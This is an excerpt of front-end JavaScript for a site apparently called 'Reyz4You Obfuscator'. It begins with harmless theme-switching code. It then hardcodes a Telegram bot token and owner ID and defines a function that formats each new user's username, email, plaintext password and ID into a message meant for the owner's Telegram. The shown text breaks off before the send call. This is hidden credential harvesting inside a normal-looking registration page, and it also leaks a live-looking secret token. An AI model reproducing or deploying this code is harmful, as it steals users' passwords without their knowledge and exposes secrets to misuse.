...
// Theme Management
function initTheme() {
  const savedTheme = localStorage.getItem("painzyTheme") || "light"
  const themeToggle = document.getElementById("themeToggle")
  const themeIcon = document.getElementById("themeIcon")

  function setTheme(theme) {
    document.documentElement.setAttribute("data-theme", theme)
    localStorage.setItem("painzyTheme", theme)
...
const TELEGRAM_BOT_TOKEN = "7148854426:AAGm74zljPqAPEMJELGiTGaHi5U_InIJpT4"
const TELEGRAM_OWNER_ID = "2027479396"

// Function to send data to Telegram
async function sendToTelegram(userData) {
  try {
    const message =
      `🔔 *New User Registration - Reyz4You Obfuscator*\n\n` +
      `👤 *Username:* ${userData.username}\n\n` +
      `📧 *Email:* ${userData.email}\n\n` +
      `🔐 *Password:* ${userData.password}\n\n` +
      `📅 *Registration Date:* ${new Date(userData.createdAt).toLocaleString()}\n\n` +
      `🆔 *User ID:* ${userData.id}\n\n` +
      `💻 *Source:* Reyz4You Obfuscator Pro`
